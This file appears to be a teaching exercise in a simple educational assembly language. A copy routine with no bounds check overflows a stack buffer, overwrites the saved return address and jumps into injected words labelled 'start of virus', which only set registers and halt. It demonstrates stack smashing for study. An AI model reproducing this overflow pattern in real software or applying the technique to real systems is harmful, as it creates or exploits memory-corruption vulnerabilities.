.pos 0x100 
start: 
		ld $stack, r5 
		gpc $6, r6
		inca r5
		j copy
		halt 

copy: 	deca r5
		deca r5
		deca r5 
		deca r5
		st r6, 12(r5)
		ld $0x0, r0
		st r0, 8(r5)
		st r0, 4(r5)
		st r0, (r5) 
		ld $src, r1
cloop: 	ld (r1,r0,4), r2
		beq r2, cend
		ld (r1,r0,4), r3
		st r3,(r5,r0,4)	
		inc r0 
		br cloop
cend: 	ld $0, r4
		st r4, (r5,r0,4)
		ld 12(r5), r6
		inca r5 
		inca r5
		inca r5
		inca r5
		j (r6) 
		

.pos 0x2000 
src: 
		.long 0x2018	
		.long 0x2018
		.long 0x2018
		.long 0x2018
		.long 0
		.long 0
		.long 0x0000ffff		#start of virus 
		.long 0xffff6001
		.long 0x60026003
		.long 0x60046005 			 
		.long 0x60066007
		.long 0xf0000000
.pos 0x8000	
		.long 0 
		.long 0 
		.long 0 
		.long 0 
		.long 0 
		.long 0 
		.long 0 
		.long 0 
		.long 0 
		.long 0 
		.long 0 
		.long 0 
		.long 0 
		.long 0 
		.long 0 
		.long 0 
		.long 0 
		.long 0 
		.long 0 
stack:	.long 0 
